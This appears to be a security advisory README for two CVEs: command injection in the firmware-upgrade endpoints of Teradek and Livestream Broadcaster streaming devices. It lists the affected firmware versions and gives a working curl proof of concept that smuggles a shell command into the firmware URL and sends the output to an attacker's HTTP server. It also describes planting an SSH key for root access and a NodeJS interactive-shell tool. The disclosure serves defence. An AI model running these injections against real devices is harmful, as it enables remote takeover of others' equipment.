# CVE-2020-27685 - Teradek devices upgrade Remote Code Execution
The endpoint to upgrade a Teradek Device has an option to pass along a http url to download the firmware. The Upgrade endpoint performs a curl/wget request without sanitizing the http url being provided. On the Teradek devices you can set up a login feature to allow only authenticated users upgrade but by default it's not enabled. Originally disclosed to Teradek on October 18th 2019 at 9:53 AM EST.

## Effected device firmwares
* BoltManager - 1.0.5 (Uncertain)
* Bond II (Legacy) - 7.3.14 (EOL)
* Bond Pro (Legacy) - 7.3.14, 7.3.17 (EOL)
* Brik - 7.22 (EOL)
* Colr - 1.2.11 (Pending)
* Clip - 1.1.3 (EOL)
* Cube - 7.3.14 (EOL)
* Cube Pro - 7.3.14 (EOL)
* Slice 600/700 - 8.2.7 (Patched)
* Cube 600/700 - 8.2.7 (Patched)
* Bond 600/700 - 8.2.7 (Patched)
* OMOD - 1.2.10 (Uncertain)
* ServPro - 2.1.4 (Pending)
* Slice - 7.3.14 (EOL)
* Sphere - 1.1.0 (EOL)
* T-Rax - 1.3.5 (Pending)
* T-Rax 700 - 8.2.7 (Patched)
* Vidiu - 3.0.8 (EOL)
* Vidiu Mini - 3.0.8 (EOL)
* Vidiu Go - 3.1.7 (Patched)
* Vidiu Pro - 3.1.7 (Patched)

# CVE-2020-27686 - Livestream Broadcaster devices upgrade Remote Code Execution
Similar to the Teradek upgrade RCE the broadcaster series of devices suffer from the same vulnability but there isn't a way to add authenication to the device to mitigate a bit. Also the Livestream Broadcaster devices have an SSH server enabled which with exploiting you are able to append your own SSH public key to `/root/.ssh/authorized_keys` and login to the device remotely. Orignally disclosed to Livestream/Vimeo on October 17th 2019 at 7:09 PM EST.

## Effected device firmware
* Livestream Broadcaster - 2.1.6
* Livestream Broadcaster Mini - 2.1.6
* Livestream Broadcaster Pro - 2.1.6

# Basic proof of concept
Change the IP address of `172.16.1.1` to the one of the device and the IP Address `172.16.1.5` to one of your attacking device with a HTTP server listening for connections.

NOTE: The following proof of concept doesn't take in count of the authentication of Teradek devices, didn't add due to not having a device to test on.
```
curl -X POST \
'http://172.16.1.1/cgi-bin/upgrade.cgi' \
-d "type=http&uploadfile=http://172.16.1.5:8000/%24%28whoami%29"
```
# Prompted proof of concept
This is a NodeJS proof of concept that sets up a http server then listens for connections and gives you a prompt to send commands to the device.
## Install
First you would need to install the node packages the proof of concept uses.

```
$ npm install
```

## Running proof of concept
Before running the PoC please open `poc.js` to configure the exploit. The proof of concept preps the device so it's possible to run commands remotely by setting the device in preupgrade mode. Afterwards a prompt will be given to run commands.

```
$ node poc.js
```
